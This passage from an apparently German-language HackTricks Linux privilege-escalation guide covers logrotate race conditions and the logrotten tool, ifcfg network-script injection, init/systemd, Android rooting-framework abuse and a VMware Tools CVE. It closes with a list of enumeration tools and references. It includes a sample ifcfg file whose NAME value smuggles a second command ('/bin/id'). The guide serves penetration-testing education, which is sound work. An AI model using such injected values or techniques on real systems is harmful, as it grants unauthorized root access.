Ein privilegierter `logrotate`-Job kann einen benutzerübergreifenden Dateischreibpfad schaffen, wenn er tatsächlich ein Log unterhalb eines Verzeichnisses rotiert, das ein Benutzer mit geringeren Privilegien während der Rotation ersetzen oder umleiten kann. Ein beschreibbares Log allein ist nur ein Hinweis. Prüfe die genaue aktive Regel und ihre Direktiven `create`, `olddir` und `su`; die effektive Identität des Schedulers; Schreib- und Suchrechte für das übergeordnete Verzeichnis des Logs; sowie, ob die installierte Version und Richtlinie die Änderung des Ziels zulassen. Eine später gestartete privilegierte Shell muss außerdem die resultierende Datei laden, damit ein Schreibzugriff auf eine Startdatei zur Befehlsausführung führt. Untersuche den Zeitplan, die Regel, die Version und Paketierung sowie die Pfadmetadaten, ohne eine Rotation auszulösen oder den Race zu versuchen.

> [!TIP]
> Behandle `3.18.0` oder irgendeine Versionszeichenfolge nicht allein als Grenze für die Ausnutzbarkeit. Das [Änderungsprotokoll des Upstream-Projekts](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) dokumentiert Härtungen gegen Probleme mit Verzeichnissen und Symlinks in mehreren Releases; Distributionen können Fixes zurückportieren. Im [Upstream-Handbuch](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) wird `su` empfohlen, wenn root Logs in Verzeichnissen rotiert, die von nicht privilegierten Benutzern kontrolliert werden. Überprüfe die tatsächlich wirksame Regel und das tatsächliche Verhalten.

Weitere Informationen zur Schwachstelle findest du auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Du kannst diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-Logs)** sehr ähnlich. Wenn du also feststellst, dass du Logs ändern kannst, prüfe, wer diese Logs verwaltet und ob du durch Ersetzen der Logs durch Symlinks deine Privilegien erweitern kannst.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Eine `ifcfg-*`-Datei ist ein Prüfhinweis, wenn ein Benutzer mit geringeren Privilegien sie erstellen oder ändern kann **und** ein privilegierter Netzwerkaktivierungspfad genau diese Datei einliest. Prüfe die effektiven Datei- und Verzeichnisberechtigungen, die ausgewählte Schnittstelle, die installierte Implementierung von `ifup`/`ifdown` und wer diese aufruft. Eine beschreibbare Datei allein führt nicht zur Ausführung. Der [Netzwerkleitfaden von Red Hat für RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) unterscheidet zwischen älteren Netzwerkskripten und NetworkManager: Letzterer löst Ersteres nicht selbst aus. Die [RHEL-8-Dokumentation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) hält fest, dass `ifup`/`ifdown` standardmäßig NetworkManager verwenden, während das optionale Legacy-Paket Shell-Skripte bereitstellt.

Auf einem System, das tatsächlich privilegierte Legacy-Skripte verwendet, kann eine nicht in Anführungszeichen gesetzte Zuweisung in einer `ifcfg-*`-Datei, die als Shell-Code eingelesen wird, etwa `NAME=`, eine Grenze zur Codeausführung überschreiten. Überprüfe den genauen Parser, den Wert und den Aktivierungspfad; leite die Interpretation als Shell-Code nicht allein aus dem Dateinamen oder dem Vorhandensein von NetworkManager ab. Ein über `sudo` erlaubter Wrapper, der Eingaben des Aufrufers in eine `ifcfg-*`-Datei schreibt und anschließend das Legacy-`ifup` aufruft, bietet einen separaten Weg über diese Grenze, selbst wenn der Aufrufer die Datei nicht direkt bearbeiten kann.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Beachten Sie das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Dienstverwaltungssystem**. Es umfasst Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Diensten. Diese können direkt oder über symbolische Links in `/etc/rc?.d/` ausgeführt werden. Auf Redhat-Systemen gibt es als alternativen Pfad `/etc/rc.d/init.d`.

Andererseits ist `/etc/init` mit **Upstart** verbunden, einer neueren, von Ubuntu eingeführten **Dienstverwaltung**, die Konfigurationsdateien für Verwaltungsaufgaben von Diensten verwendet. Trotz des Wechsels zu Upstart werden SysVinit-Skripte dank einer Kompatibilitätsschicht in Upstart weiterhin parallel zu Upstart-Konfigurationen verwendet.

**systemd** ist ein moderner Initialisierungs- und Dienstmanager mit erweiterten Funktionen wie dem bedarfsgesteuerten Start von Daemons, der Automount-Verwaltung und Snapshots des Systemzustands. Es organisiert Dateien unter `/usr/lib/systemd/` für Distributionspakete und unter `/etc/systemd/system/` für Änderungen durch Administratoren und vereinfacht so die Systemverwaltung.<sup>[[21]](#references)</sup>

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Aus eingeschränkten Shells ausbrechen


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco – vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android-Rooting-Frameworks: Missbrauch des Manager-Kanals

Android-Rooting-Frameworks hängen sich häufig in einen Syscall ein, um einem Userspace-Manager privilegierte Kernel-Funktionen bereitzustellen. Eine schwache Authentifizierung des Managers (z. B. Signaturprüfungen, die auf der Reihenfolge von FD basieren, oder schwache Passwörter) kann es einer lokalen App ermöglichen, sich als Manager auszugeben und auf bereits gerooteten Geräten ihre Rechte bis zum Root-Zugriff auszuweiten. Weitere Informationen und Details zur Ausnutzung finden Sie hier:


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware-Tools-Diensterkennung LPE (CWE-426) mittels Regex-basierter Ausführung (CVE-2025-41244)

Die Regex-gesteuerte Diensterkennung in VMware Tools/Aria Operations kann einen Binärpfad aus den Befehlszeilen von Prozessen extrahieren und ihn mit `-v` im privilegierten Kontext ausführen. Zu großzügige Muster (z. B. mit `\S`) können von Angreifern bereitgestellte Listener an beschreibbaren Speicherorten (z. B. `/tmp/httpd`) erfassen, was zur Ausführung als Root führen kann (CWE-426: Untrusted Search Path).<sup>[[27]](#references)</sup>

Weitere Informationen und ein verallgemeinertes Muster, das auch auf andere Discovery-/Monitoring-Stacks anwendbar ist, finden Sie hier:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Sicherheitsmaßnahmen für den Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix-Privesc-Tools

### **Bestes Tool zum Auffinden lokaler Linux-Privilege-Escalation-Angriffspunkte:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(Option -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Kernel-Schwachstellen unter Linux und MAC auflisten [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physischer Zugriff):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Sammlung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (Crontab-UI-Privesc, Wiederverwendung von zip -P-Zugangsdaten)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: gefälschte .text_sig-Payload für einen per Cron ausgeführten Monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Umgehung von Neighborhood Watch (sudo env_keep PATH-Hijacking)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Grundlegende Linux-Privilege-Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Leitfaden zur Linux-Privilege-Escalation](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Angriff und Verteidigung: Linux-Privilege-Escalation-Techniken von 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Niemand erwartet die Befehlsausführung!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux-Privilege-Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Durchgang durch die Laborübungen - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Tipps und Tricks zur Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux-Enumeration- und Privilege-Escalation-Tool](https://github.com/rtcrowley/linux-private-i)
- [14] [Was ist ein Socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) – Write-up](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS kennenlernen](https://www.linuxjournal.com/article/7744)
- [17] [SUID-Programme: Linux-Privilege-Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Teil 2 – Linux-Privilege-Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [ACLs unter Linux verwalten](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root-Zugriff auf Redhat/CentOS über network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Was ist systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (Bash-Arithmetikinjektion über Logs, vollständige Angriffskette)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash-Handbuch – BASH_ENV (Startdatei für nicht interaktive Shells)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → Root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR-Symlink-Privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup-Cron-Kopie → SUID-bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Wie man es nennt, VMware stuft es hoch (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo-Chroot-Rechteausweitung](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 und CVE-2025-32463: Schwachstellen zur Rechteausweitung in Sudo](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC-Repositoryverzeichnisse](https://peps.python.org/pep-3147/)
- [32] [Python-importlib-Dokumentation](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit-Issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet von @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com – Passwörter unter Linux protokollieren](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at – Details zu einer Logrotate-Race-Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python-3.10-Dokumentation – `site` und Pfadkonfigurationsdateien](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
